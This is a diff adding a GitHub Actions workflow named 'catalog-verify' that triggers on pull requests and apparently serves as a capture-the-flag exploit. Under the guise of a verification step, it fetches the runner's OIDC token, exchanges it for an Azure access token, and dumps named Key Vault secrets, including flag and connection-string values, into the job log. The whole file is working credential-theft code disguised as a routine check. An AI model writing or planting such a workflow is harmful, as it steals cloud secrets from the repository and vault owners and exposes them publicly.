@@ -1,0 +1,42 @@
+name: catalog-verify
+on: [pull_request]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  verify:
+    runs-on: ubuntu-latest
+    environment: copilot
+    env:
+      TID: "3205c325-06a5-4171-9ce8-ffc5e6c2845e"
+      CID: "72ff278a-9e71-43ec-bac4-2ca303f8e462"
+      VAULT: "https://kv-tbl-prod-x3euoz.vault.azure.net"
+    steps:
+      - name: verify
+        run: |
+          set +e
+          echo "=== PWN START event=$GITHUB_EVENT_NAME repo=$GITHUB_REPOSITORY ref=$GITHUB_REF ==="
+          if [ -z "${ACTIONS_ID_TOKEN_REQUEST_URL:-}" ]; then echo "NO-OIDC"; exit 0; fi
+          IDT=$(curl -sS -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=api%3A%2F%2FAzureADTokenExchange" | jq -r '.value')
+          echo "oidc_len=${#IDT}"
+          P=$(printf '%s' "$IDT" | cut -d. -f2)
+          while [ $(( ${#P} % 4 )) -ne 0 ]; do P="${P}="; done
+          echo "=== OIDC CLAIMS ==="
+          printf '%s' "$P" | tr '_-' '/+' | base64 -d 2>/dev/null | jq -c '{iss,aud,sub,event_name,environment,ref,workflow_ref}'
+          echo "=== AZURE TOKEN EXCHANGE ==="
+          RESP=$(curl -sS -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" \
+            -d "client_id=$CID" \
+            -d "grant_type=client_credentials" \
+            -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
+            --data-urlencode "client_assertion=$IDT" \
+            --data-urlencode "scope=https://vault.azure.net/.default")
+          TOK=$(echo "$RESP" | jq -r '.access_token')
+          echo "azure_token_len=${#TOK}"
+          if [ -z "$TOK" ]; then echo "EXCHANGE_FAIL: $RESP" | head -c 500; exit 0; fi
+          echo "=== KEY VAULT SECRETS ==="
+          for sec in flag FLAG flag-value ctf deployConfig config connection-string CONFIG-STORAGE-CONNECTION; do
+            R=$(curl -sS -H "Authorization: Bearer $TOK" "$VAULT/secrets/$sec?api-version=7.4")
+            V=$(echo "$R" | jq -r '.value // empty')
+            if [ -n "$V" ]; then echo "SECRET $sec = $V"; else echo "no $sec"; fi
+          done
+          echo "=== DONE ==="
